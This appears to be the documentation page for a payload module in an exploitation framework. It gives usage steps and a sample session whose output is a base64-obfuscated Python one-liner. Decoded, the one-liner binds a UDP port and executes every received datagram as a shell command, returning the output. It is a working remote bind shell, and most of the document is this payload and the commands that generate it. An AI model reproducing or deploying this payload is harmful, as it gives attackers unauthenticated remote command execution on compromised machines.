## Description

Module generates payload that creates interactive udp bind shell by using python. 

## Verification Steps

  1. Start the framework: `embedxpl` (or `python -m embedxpl` / `./exf.py`)
  2. Do: `use payloads/python/bind_udp`
  3. Do: `set rport 4321`
  4. Do: `run`
  5. Module generates python udp bind shell payload

## Scenarios

```
exf > use payloads/python/bind_udp
exf (Python Bind UDP) > set rport 4321
[+] rport => 4321
exf (Python Bind UDP) > run
[*] Running module...
[*] Generating payload
exec('ZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBQb3BlbixQSVBFCmZyb20gc29ja2V0IGltcG9ydCBzb2NrZXQsIEFGX0lORVQsIFNPQ0tfREdSQU0Kcz1zb2NrZXQoQUZfSU5FVCxTT0NLX0RHUkFNKQpzLmJpbmQoKCcwLjAuMC4wJyw0MzIxKSkKd2hpbGUgMToKCWRhdGEsYWRkcj1zLnJlY3Zmcm9tKDEwMjQpCglvdXQ9UG9wZW4oZGF0YSxzaGVsbD1UcnVlLHN0ZG91dD1QSVBFLHN0ZGVycj1QSVBFKS5jb21tdW5pY2F0ZSgpCglzLnNlbmR0bygnJy5qb2luKFtvdXRbMF0sb3V0WzFdXSksYWRkcikK'.decode('base64'))
```
